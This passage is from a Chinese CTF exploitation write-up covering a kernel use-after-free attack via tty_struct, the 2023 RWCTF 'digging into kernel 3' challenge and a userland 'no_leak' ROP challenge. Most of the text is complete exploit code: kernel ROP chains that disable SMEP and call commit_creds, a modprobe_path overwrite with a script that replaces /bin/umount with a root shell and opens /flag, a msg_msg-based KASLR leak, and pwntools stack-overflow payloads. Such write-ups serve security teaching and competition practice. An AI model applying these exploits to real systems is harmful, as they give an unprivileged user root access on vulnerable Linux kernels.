	// 	sleep(3)
	// 	system("/bin/sh");
	// 	exit(0);
	// }
	else 
	{
		wait(NULL);
		printf("parent pid is: %d\n",getpid());
	}
	// {
	// 	char zeros[30] = {0};
	// 	write(fd2,zeros,28);
	// 	wait(NULL);
	// 	printf("parent pid is: %d\n",getpid());
	// }
	printf("%d: going to close fd2\n",getpid());
	close(fd2);
	return 0;
}
```


还有一种可以利用的就是tty_struct结构体
这个结构体是在开启/dev/ptmx设备节点时，会被分配到一个0x2e0（不同内核版本有所区别）的结构体tty_struct
这个结构体如下
```c
struct tty_struct {
	int	magic; //4
	struct kref kref;//4
	struct device *dev;//8
	struct tty_driver *driver;//8
	const struct tty_operations *ops; 
  // ······
}
// https://elixir.bootlin.com/linux/v4.7.2/source/include/linux/tty.h#L272
```

```c
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
  // ......
}
```

这个结构体里存放的是对应终端的一些操作函数,这些函数包括但不限于：

open：打开一个 TTY 设备。
close：关闭一个 TTY 设备。
write：向 TTY 设备写入数据。
read：从 TTY 设备读取数据。
ioctl：执行控制操作，如改变终端设置。
set_termios：设置终端的属性。

可以去劫持这个结构体里的函数指针实现利用

由于要在内核态执行ROP，所以需要保存用户态上下文和考虑用户态着陆，这部分都是板子内容就不再赘述
这里的思路是，利用UAF漏洞劫持tty_struct结构体，利用read函数将结构体的数据提取出来便于伪造，修改tty_operations指针为我们在用户态设置的伪造tty_operations的地址，然后伪造tty_operations，这里主要劫持write函数，通过调试得到在执行该write函数时，rax为用户态伪造tty_operations的地址，所以将整个tty_operations结构体覆盖为mov rsp rax，这样就能控制执行流到tty_operations结构体开始的位置，然后在tty_operations结构体的前边放置好栈迁移指令，迁移到用户态上构造的ROP链，就完成了利用。
这里开启了smep，要在ROP的时候修改cr4寄存器来关闭smep，常将cr4的值设置为0x6f0

EXP
将-enable-kvm参数删除
```c
//gcc -Wall -static -o exp exp2.c
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

size_t pkc_addr = 0xffffffff810a1810;
size_t cc_addr = 0xffffffff810a1420;
void get_root(){
    char* (*pkc)(int) = pkc_addr;
    void (*cc)(char*) = cc_addr;
    (*cc)((*pkc)(0));
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status()
{
    __asm__("mov %cs, user_cs;"
            "mov %ss, user_ss;"
            "mov %rsp, user_sp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

int main(){
    save_status();

    size_t mov_rsp_rax = 0xffffffff8181bfc5;    // mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e
    size_t pop_rax = 0xffffffff8100ce6e;        // pop rax; ret; 
    size_t rop_chain[30] = {0};
    int index = 0;
    rop_chain[index++] = 0xffffffff810d238d;        // pop rdi; ret;
    rop_chain[index++] = 0x6f0;
    rop_chain[index++] = 0xffffffff81004d80;        // mov cr4, rdi; pop rbp; ret; 
    rop_chain[index++] = 0x0;
    rop_chain[index++] = (size_t)get_root;
    rop_chain[index++] = 0xffffffff81063694;        // swapgs; pop rbp; ret; 
    rop_chain[index++] = 0x0;
    rop_chain[index++] = 0xffffffff814e35ef;        // iretq; ret;
    rop_chain[index++] = (size_t)get_shell;
    rop_chain[index++] = user_cs;
    rop_chain[index++] = user_rflags;
    rop_chain[index++] = user_sp;
    rop_chain[index++] = user_ss;

    size_t tty_operations_fake[30];
    for(int j=0;j<30;j++){
        tty_operations_fake[j]=mov_rsp_rax;   
    }

    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x2e0);
    close(fd1);

    int fd_tty = open("dev/ptmx",2);

    size_t tty_struct_leak[4];
    read(fd2,tty_struct_leak,32);
    
    tty_operations_fake[0] = pop_rax;
    tty_operations_fake[1] = (size_t)rop_chain;
    tty_operations_fake[2] = mov_rsp_rax;

    tty_struct_leak[3] = (size_t)tty_operations_fake;
    write(fd2,tty_struct_leak,32);

    size_t a[4] = {0,0,0,0};
    write(fd_tty,a,32);
    // ioctl(fd_tty,0x100,32);

    close(fd2);
	return 0;
}
```



### 2023RWCTF digging into kernel 3

先检查信息
```shell
#!/bin/sh
qemu-system-x86_64 \
        -m 128M \
        -nographic \
        -kernel ./bzImage \
        -initrd ./rootfs.img \
        -enable-kvm \
        -cpu kvm64,+smap,+smep \
        -monitor /dev/null \
        -append 'console=ttyS0 kpti=1 quiet kaslr oops=panic panic=1 init=/init' \
        -no-reboot \
        -snapshot 
```

题目开了kaslr,smep（要用ptregs），再看下init

```shell
#!/bin/sh

mkdir /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mount -t tmpfs none /tmp

exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /rwctf.ko
chmod 666 /dev/rwctf
chmod 700 /flag
chmod 400 /proc/kallsyms

echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict

# poweroff -d 120 -f &

echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"
setsid /bin/cttyhack setuidgid 0 /bin/sh

umount /proc
umount /sys
umount /tmp

poweroff -d 0 -f
```

把超时挂起和权限改了，把run.sh里的kaslr改为nokaslr，方便调试

由于限制了/proc/kallsyms的权限，我们是看不了函数表的/proc/kallsyms，这里着重分析rwctf.ko
基本上只有一个功能rwmod_ioctl
```c
__int64 __fastcall rwmod_ioctl(__int64 a1, int a2, __int64 a3)
{
  __int64 v3; // r12
  __int64 v5; // rbx
  __int64 v6; // rdi
  unsigned int idx; // [rsp+0h] [rbp-30h] BYREF
  unsigned int size; // [rsp+4h] [rbp-2Ch]
  __int64 con; // [rsp+8h] [rbp-28h]
  unsigned __int64 v10; // [rsp+18h] [rbp-18h]

  v10 = __readgsqword(0x28u);
  if ( !a3 )
    return -1LL;
  if ( a2 == 0xC0DECAFE )
  {
    if ( !copy_from_user(&idx, a3, 0x10LL) && idx <= 1 )
      kfree(buf[idx]);
    return 0LL;
  }
  v3 = -1LL;
  if ( a2 == 0xDEADBEEF )
  {
    if ( copy_from_user(&idx, a3, 0x10LL) )
      return 0LL;
    v5 = idx;
    if ( idx > 1 )
      return 0LL;
    buf[v5] = _kmalloc(size, 0xDC0LL);
    v6 = buf[idx];
    if ( !v6 )
      return 0LL;
    if ( size > 0x7FFFFFFFuLL )
      BUG();
    if ( copy_from_user(v6, con, size) )
      return 0LL;
  }
  return v3;
}
```

根据a2不同执行不同的分支
关于copy_from_user

```c
unsigned long copy_from_user(void *to, const void __user *from, unsigned long n);

两个参数都是指针，返回未成功复制的字节数
```


当a2为0xC0DECAFE，把a3里边的值拷贝到idx，idx只能取0和1，然后一个UAF
当a2为0xDEADBEEF，就是开一个size的堆块放到buf里，idx只能取0和1，size不能过大，再把内容拷贝过去，结合栈结构，先先写一个结构体
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105172824.png)

```c
struct rwstruct{
	unsigned int idx;//4
	unsigned int size;//4
	char *con;//8
}
```

2个功能菜单

```c
int g_fd;

int rwctf_ioctl_kmalloc(int idx,int size, char* con){
	struct rwstruct rw_buf;
	rw_buf.idx = idx;
	rw_buf.size = size;
	rw_buf.con = con;
	ioctl(g_fd,0xDEADBEEF,&rw_buf);
}


int rwctf_ioctl_kfree(int idx){
	struct rwstruct rw_buf;
	rw_buf.idx = idx;
	rw_buf.size = 0;
	rw_buf.con = 0;
	ioctl(g_fd,0xC0DECAFE,&rw_buf);
}
```

有了任意size创建和UAF，接下来就可以开始利用了

#### 方法一
首先考虑没有kalsr下如何完成利用
后续肯定是要ptregs实现ROP的，有了任意堆大小的UAF可以劫持seq_operations，用seq_operations+pt_regs+modprobe_path

```c
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <err.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/timerfd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/keyctl.h>
#include <time.h>

#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

void hexdump(void *mem, unsigned int len) {
    putchar('\n');
    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {
        /* print offset */
        if(i % HEXDUMP_COLS == 0) {
            printf("0x%06x: ", i);
        }

        /* print hex data */
        if(i < len) {
            printf("%02x ", 0xFF & ((char*)mem)[i]);
        }
        /* end of block, just aligning for ASCII dump */
        else {        
            printf("   ");
        }

        /* print ASCII dump */
        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {
            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {
                 /* end of block, not really printing */
                if(j >= len) {
                    putchar(' ');
                }
                /* printable char */
                else if(isprint(((char*)mem)[j])) {
                    putchar(0xFF & ((char*)mem)[j]);
                }
                 /* other char */
                else {
                    putchar('.');
                }
            }
            putchar('\n');
        }
    }
    putchar('\n');
}

int g_fd;
int seq_fd;
int64_t seq_read_buf[4];

struct rwstruct{
    unsigned int idx;
    unsigned int size;
    char* con;
};


int rwctf_ioctl_kmalloc(int idx, int size, char* con){
    struct rwstruct rw_buf;
    rw_buf.idx = idx;
    rw_buf.size = size;
    rw_buf.con = con;
    ioctl(g_fd,0xDEADBEEF,&rw_buf);
}

int rwctf_ioctl_kfree(int idx){
    struct rwstruct rw_buf;
    rw_buf.idx = idx;
    rw_buf.size = 0;
    rw_buf.con = 0;
    ioctl(g_fd,0xC0DECAFE,&rw_buf);
}


int prepare(){
    system("echo '#!/bin/sh\nrm /bin/umount\necho -e \"#!/bin/sh\\n/bin/sh\" > /bin/umount\nchmod 777 /bin/umount' > /tmp/x");
    system("chmod +x /tmp/x");//0x782f706d742f
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    if(fork()) {
        sleep(3);
        system("/tmp/dummy 2>/dev/null");
        system("ls -l /flag");
        system("cat /flag");
        exit(1);
    }
}

int64_t add_rsp_170_ret = 0xffffffff819d9f4c;
int64_t pop_rax_ret = 0xffffffff81000ddb;
int64_t pop_rdi_ret = 0xffffffff8106ab4d;
int64_t mov_ptr_rdi_rax_ret = 0xffffffff81074e3c; //: mov qword ptr [rdi], rax ; xor eax, eax ; jmp 0xffffffff82003240;
int64_t modprobe_path_addr = 0xFFFFFFFF828510A0;
int64_t do_task_dead_func = 0xFFFFFFFF810A3190;
int64_t pop_rbp_ret = 0xffffffff810679ef;

int hijack(){



    int OBJ_SIZE = 0x20;
    char * tmp_buf = malloc(OBJ_SIZE);
    memset(tmp_buf,'a',OBJ_SIZE);
    rwctf_ioctl_kmalloc(0,OBJ_SIZE,tmp_buf);
    rwctf_ioctl_kfree(0);

    seq_fd = open("/proc/self/stat",0);
    rwctf_ioctl_kfree(0);
    char fake_seq_operations[OBJ_SIZE];
    memset(fake_seq_operations,'0',OBJ_SIZE);
    *(unsigned long long *)&fake_seq_operations[0x0] = add_rsp_170_ret;
    *(unsigned long long *)&fake_seq_operations[0x8] = 0x0;
    *(unsigned long long *)&fake_seq_operations[0x10] = 0x0;
    *(unsigned long long *)&fake_seq_operations[0x18] = 0x0;

    rwctf_ioctl_kmalloc(0,OBJ_SIZE,fake_seq_operations);
    //int64_t seq_read_buf[4];
    __asm__(
        "mov r15, 0x15151515;"      // 
        "mov r14, pop_rax_ret;"      // 1
        "mov r13, 0x782f706d742f;"      // 2
        "mov r12, pop_rdi_ret;"      // 3
        "mov r11, 0x11111111;"      // 
        "mov r10, mov_ptr_rdi_rax_ret;"      // 7
        "mov rbp, modprobe_path_addr;"      // 4
        "mov rbx, pop_rbp_ret;"      // 5
        "mov r9, do_task_dead_func;"       // 8
        "mov r8, 0x88888888;"       // 9
        "mov rcx, 0xcccccccc;"
        "xor rax, rax;"             // 6
        "mov rdx, 0x20;"            //
        "mov rsi, seq_read_buf;"
        "mov rdi, seq_fd;"          // read(seq_fd,seq_read_buf,0x20)
        "syscall"
    );
}


int main(){
    g_fd  = open("/dev/rwctf",2);
    prepare();
    hijack();
}
```


难点在于leak偏移，这里用的是劫持user_key_payload的方法，利用UAF劫持user_key_payload结构体，泄露内核堆上的内容，再结合key_revoke+add_key堆喷，就能泄露user_free_payload_rcu地址从而拿到kernelbase

#### 方法二



```c
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <err.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/timerfd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/keyctl.h>
#include <time.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/shm.h>

#define OBJSIZE 0x20
#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

int g_fd;
int64_t g_kernel_base;
int64_t kernel_elf_base = 0xffffffff81000000;
int64_t modprobe_path_addr = 0xffffffff828510a0;

struct rwstruct{
    unsigned int idx;
    unsigned int size;
    char* con;
};


int rwctf_ioctl_kmalloc(int idx, int size, char* con){
    struct rwstruct rw_buf;
    rw_buf.idx = idx;
    rw_buf.size = size;
    rw_buf.con = con;
    ioctl(g_fd,0xDEADBEEF,&rw_buf);
}

int rwctf_ioctl_kfree(int idx){
    struct rwstruct rw_buf;
    rw_buf.idx = idx;
    rw_buf.size = 0;
    rw_buf.con = 0;
    ioctl(g_fd,0xC0DECAFE,&rw_buf);
}


int g_msqid;
struct g_msgp{
  long type;
  char mtext[0xfe8];    // 0x1000-0x30+0x20-0x8 = 0xFE8
};

void hexdump(void *mem, unsigned int len) {
    putchar('\n');
    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {
        /* print offset */
        if(i % HEXDUMP_COLS == 0) {
            printf("0x%06x: ", i);
        }

        /* print hex data */
        if(i < len) {
            printf("%02x ", 0xFF & ((char*)mem)[i]);
        }
        /* end of block, just aligning for ASCII dump */
        else {        
            printf("   ");
        }

        /* print ASCII dump */
        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {
            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {
                 /* end of block, not really printing */
                if(j >= len) {
                    putchar(' ');
                }
                /* printable char */
                else if(isprint(((char*)mem)[j])) {
                    putchar(0xFF & ((char*)mem)[j]);
                }
                 /* other char */
                else {
                    putchar('.');
                }
            }
            putchar('\n');
        }
    }
    putchar('\n');
}

int msg_msgget(key_t key,int msgflg) 
{
    int msqid;
    if((msqid = msgget(key,msgflg)) == -1){              
        perror("msgget");
        exit(-1);
    }
    return msqid;
}

void msg_msgsnd(int msqid,void *msgp,size_t msgsz,int msgflg) 
{
    if(msgsnd(msqid,msgp,msgsz,msgflg) == -1){          
        perror("msgsnd");
        exit(-1);
    }
}

ssize_t msg_msgrcv(int msqid,void *msgp,size_t msgsz,long msgtyp,int msgflg) 
{
    ssize_t result;
    result = msgrcv(msqid,msgp,msgsz,msgtyp,msgflg);           
    if (result<0)
    {
        perror("msgrcv");
        exit(-1);
    }
    return result;
}

void msg_msgctl(int msqid,int cmd,struct msqid_ds *buf)         
{
    if ((msgctl(msqid,cmd,buf))==-1)                        // 删除队列 msg_msgctl(msqid,IPC_RMID,NULL);
    {
        perror("Msgctl");
        exit(-1);
    }
}

void create_shm_file_data()
{
    int shmid;
    if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) {
      perror("shmget");
      exit(0);
    }
    char *shmaddr = shmat(shmid, NULL, 0);
    if (shmaddr == (void*)-1) {
      perror("shmat");
      exit(0);
    }
}


void prepare(){
    system("echo '#!/bin/sh\nrm /bin/umount\necho -e \"#!/bin/sh\\n/bin/sh\" > /bin/umount\nchmod 777 /bin/umount' > /tmp/x");
    system("echo '\nchmod 777 /flag' >> /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    if(fork()) {
        sleep(3);
        system("/tmp/dummy 2>/dev/null");
        system("ls -l /flag");
        system("cat /flag");
        exit(1);
    }
}


int aaw(int64_t *aim_addr, char *shell_addr){
    char *buf = malloc(OBJSIZE);
    memset(buf,'a',OBJSIZE);
    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);
    rwctf_ioctl_kfree(0);
    rwctf_ioctl_kfree(0);

    memcpy(buf+0x10,aim_addr,8);
    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);
    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);
    rwctf_ioctl_kmalloc(0,OBJSIZE,shell_addr);
}

int leak(){
    char *buf = malloc(OBJSIZE);
    memset(buf,'a',OBJSIZE);
    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);
    rwctf_ioctl_kfree(0);

    struct g_msgp msgp;
    msgp.type = 1;   
    memset(msgp.mtext,'a',0xfe8);
    g_msqid = msg_msgget(IPC_PRIVATE,IPC_CREAT|0666);
    msg_msgsnd(g_msqid,&msgp,sizeof(msgp.mtext),0);

    rwctf_ioctl_kfree(0);
    create_shm_file_data();
    
    char* recv_msg = malloc(0x1000);
    msg_msgrcv(g_msqid,recv_msg,0x1000,0,IPC_NOWAIT|MSG_NOERROR);
    // hexdump(recv_msg,0x1000);
    g_kernel_base = *(int64_t *)&recv_msg[0xfd8]- 0x19ac6c0;
    printf("[+] kernel base is : 0x%lx\n",g_kernel_base);
    free(buf);
    free(recv_msg);
}

int main(){
    g_fd = open("/dev/rwctf",2);
    prepare();
    leak();
    modprobe_path_addr = modprobe_path_addr - kernel_elf_base + g_kernel_base;
    char *buf  = malloc(OBJSIZE);
    memset(buf,'a',OBJSIZE);
    memcpy(buf,"/tmp/x\x00",7);
    aaw(&modprobe_path_addr,buf);
    return 0;
}
```












https://bbs.kanxue.com/thread-279787.htm

https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/



### no_leak

题目主要是一个栈溢出，没有任何用于输出的函数

```bash
[*] '/mnt/hgfs/ctf/pwnchall/no_leak/no_leak'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

由于没有地址随机化，我们掌握的地址有程序所有的基址，即got表、bss段地址、程序自身的gadget等

这种情况下，我们可以考虑csu的gadget（Full RELRO我们可以使用call got表、没有PIE有地址、缺少gadget）

如何拿到libc地址就是关键

```python
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  alarm(0x3Cu);
  read(0, buf, 0x100uLL);
  return 0;
}
```



#### 利用__libc_start_main函数在bss段上布置libc地址

这种思路主要是放弃泄露libc，只要libc地址在已知地址为我们所用即可

利用gadget对bss段上残留的libc地址进行加减得到system，再通过栈溢出调用bss地址上的system函数

csu的优点之一就是能控制rbp和rbx寄存器

我们搜索一下gadget

```bash
➜  no_leak ROPgadget --binary no_leak | grep "bp"
0x000000000040052c : add byte ptr [rax], al ; add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4004c0
0x000000000040052d : add byte ptr [rax], al ; add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x4004c0
0x00000000004004b6 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040052e : add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4004c0
0x00000000004004b5 : add byte ptr [rax], r8b ; pop rbp ; ret
0x000000000040052f : add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x4004c0
0x0000000000400517 : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
0x00000000004004a9 : je 0x4004b8 ; pop rbp ; mov edi, 0x601010 ; jmp rax
0x00000000004004eb : je 0x4004f8 ; pop rbp ; mov edi, 0x601010 ; jmp rax
0x00000000004006db : jmp qword ptr [rbp]
0x0000000000400512 : mov byte ptr [rip + 0x200af7], 1 ; pop rbp ; ret
0x0000000000400532 : mov ebp, esp ; pop rbp ; jmp 0x4004c0
0x0000000000400531 : mov rbp, rsp ; pop rbp ; jmp 0x4004c0
0x00000000004004b3 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000004004f5 : nop dword ptr [rax] ; pop rbp ; ret
0x0000000000400515 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400534 : pop rbp ; jmp 0x4004c0
0x00000000004004ab : pop rbp ; mov edi, 0x601010 ; jmp rax
0x00000000004005cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004005cf : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004004b8 : pop rbp ; ret
0x0000000000400530 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4004c0
```

能用的gadget肯定是以ret结尾的，其中又要能对rbx或者rbp里的内容进行加减的

```bash
0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
```

这条gadget能操作rbp里存放的值，我们如果把rbp设置为bss地址就能实现我们的目的

如何在bss上残留libc地址呢，__libc_start_main函数执行时会在函数执行位置上下文残留一些地址，其中包括了一些libc地址。如`__exit_funcs_lock`，把 libc_start_main函数布置到bss段上，栈迁移过去执行，执行的参数为p64(start)+p64(fini)+p64(init)(实测执行`_start`是行不通的，需要执行`__libc_start_main`）

> 栈迁移的方式有很多
>
> 1.三条payload read的方式，用于溢出空间不大的栈溢出
>
> 2.利用一条溢出rsu call read_got，再一条溢出设置rbp leave ret的方式，用于有次数限制的情况
>
> ......

在新的main函数流中栈溢出执行我们的加减gadget，计算system和__exit_funcs_lock的差值。整体的思路如下所示。

EXP仅供参考，有多处可优化：

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256
 
# p = remote("nc.eonew.cn","10002")
p = process("./no_leak")
elf = ELF("./no_leak")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

# ru("------------------------------   preload end     ------------------------------")


# 0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
magic = 0x0000000000400518
alarm = 0x600FE0
bss = 0x601400
read = 0x400549

libc_main = elf.got['__libc_start_main']
lg("libc_main")
main = 0x400537
csu2 = 0x4005CA
csu1 = 0x4005B0
fini = 0x4005E0
init = 0x400570
start = 0x400450

pay = 'a'*0x80+p64(bss)+p64(read)
s(pay)

pay = 'a'*0x80+p64(bss+0x80)+p64(read)
s(pay)

pay = p64(0)+p64(csu2)+p64(0)+p64(1)+p64(libc_main)+p64(start)+p64(fini)+p64(init)+p64(csu1)
s(pay)

pay  = 'a'*0x80+p64(bss)+p64(csu2)
pay += p64(0xffffffffffc5ed18)+p64(0x601340+0x3d)+p64(0)*4
pay += p64(magic)+p64(main)
s(pay)

# dbg()
pay ='/bin/sh\x00'+'b'*0x80+p64(csu2)
pay += p64(0)+p64(1)+p64(0x601340)+p64(0x601268)+p64(0)+p64(0)+p64(csu1)
s(pay)
# p.recv(timeout=0.2)
# p.recv(timeout=0.2)

ia()
```

#### 利用__libc_start_main中的输出函数gadget泄露libc

最好的情况是把libc泄露出来方便我们计算，寻求泄露函数只能求于libc，我们注意到在libc函数流程中存在一个输出函数片段

```
.text:0000000000021B3B                               loc_21B3B:                              ; CODE XREF: __libc_start_main+8F↑j
.text:0000000000021B3B 48 8B 44 24 08                mov     rax, [rsp+0B8h+var_B0]
.text:0000000000021B40 48 8B 15 11 C3 38 00          mov     rdx, cs:_rtld_global_ro_ptr
.text:0000000000021B47 48 8D 3D A1 3C 15 00          lea     rdi, aTransferringCo            ; "\ntransferring control: %s\n\n"
.text:0000000000021B4E 48 8B 30                      mov     rsi, [rax]
.text:0000000000021B51 31 C0                         xor     eax, eax
.text:0000000000021B53 FF 92 68 01 00 00             call    qword ptr [rdx+168h]
.text:0000000000021B53
.text:0000000000021B59 E9 D7 FE FF FF                jmp     loc_21A35
```

会输出rax的内容，而rax来自于rsp+0x8+var_B0，结合我们已经有了溢出，rax似乎是可以控制的，如果控制为got表项就能泄露libc。

而jmp loc_21A35则是跳转到`__libc_start_main`的主逻辑部分正常执行，满足我们的要求

```
.text:0000000000021A35                               loc_21A35:                              ; CODE XREF: __libc_start_main+1B9↓j
.text:0000000000021A35 48 8D 7C 24 20                lea     rdi, [rsp+0B8h+var_98]          ; env
.text:0000000000021A3A E8 F1 29 01 00                call    _setjmp
.text:0000000000021A3A
.text:0000000000021A3F 85 C0                         test    eax, eax
.text:0000000000021A41 75 4B                         jnz     short loc_21A8E
.text:0000000000021A41
.text:0000000000021A43 64 48 8B 04 25 00 03 00 00    mov     rax, fs:300h
.text:0000000000021A4C 48 89 44 24 68                mov     [rsp+0B8h+var_50], rax
.text:0000000000021A51 64 48 8B 04 25 F8 02 00 00    mov     rax, fs:2F8h
.text:0000000000021A5A 48 89 44 24 70                mov     [rsp+0B8h+var_48], rax
.text:0000000000021A5F 48 8D 44 24 20                lea     rax, [rsp+0B8h+var_98]
.text:0000000000021A64 64 48 89 04 25 00 03 00 00    mov     fs:300h, rax
.text:0000000000021A6D 48 8B 05 34 C4 38 00          mov     rax, cs:environ_ptr
.text:0000000000021A74 48 8B 74 24 08                mov     rsi, [rsp+0B8h+var_B0]
.text:0000000000021A79 8B 7C 24 14                   mov     edi, [rsp+0B8h+var_A4]
.text:0000000000021A7D 48 8B 10                      mov     rdx, [rax]
.text:0000000000021A80 48 8B 44 24 18                mov     rax, [rsp+0B8h+var_A0]
.text:0000000000021A85 FF D0                         call    rax
.text:0000000000021A85
.text:0000000000021A87
.text:0000000000021A87                               loc_21A87:                              ; CODE XREF: __libc_start_main+156↓j
.text:0000000000021A87 89 C7                         mov     edi, eax
.text:0000000000021A89 E8 12 53 01 00                call    exit
```



我们注意到返回地址本就是`__libc_start_main`加上偏移的地址，所以我们爆破0x21B3B 地址，来实现功能。再根据动调判断执行mov     rax, [rsp+0B8h+var_B0]时取的是栈上的哪个值，溢出覆盖即可。

```python
# 第一次溢出
p =  'a' * 0x80
p += p64(rbp)
p += p64(_start)
p += '\x00'*8
p += p64(elf.got['read']) 
```

拿到libc后就不再赘述，rop即可



EXP仅供参考，有多处可优化：

```python
# _*_ coding:utf-8 _*_
from pwn import *

context.log_level = 'debug'
elf = ELF('./no_leak')
libc_path = './libc.so.6'
libc = ELF(libc_path)
io = elf.process()
# io = remote('nc.eonew.cn', 10002)

# io.recvuntil("------------------------------   preload end     ------------------------------\n")

context.terminal = ['tmux', 'splitw', '-hp','64']

def dbg(breakpoint=''):
    gdb.attach(io)
    pause()

# dbg()

_start = 0x400450
leave = 0x400564
main = 0x400537
pop_rdi = 0x00000000004005d3 # pop rdi ; ret
pop_rsi_r15 = 0x00000000004005d1 # pop rsi ; pop r15 ; ret
__libc_csu_init_gadget      = 0x4005CB # __libc_scu_init pop_5_ret
__libc_csu_init_gadget_call = 0x4005B0 #
buf = elf.bss() + 0x800
rbp = buf - 8

p = b'A' * 0x80
p += p64(rbp)
p += p64(_start)
p += '\x00'*8
p += p64(elf.got['read']) 

io.send(p)

# leak libc
p =  b'A' * 0x88
p += b'\x3b\x7b'

io.send(p)
libc_base = u64(io.recvuntil('\x7f')[-6:] + b'\x00\x00') - libc.sym['read']
print('libc_base: ' + hex(libc_base))
sleep(0.5)

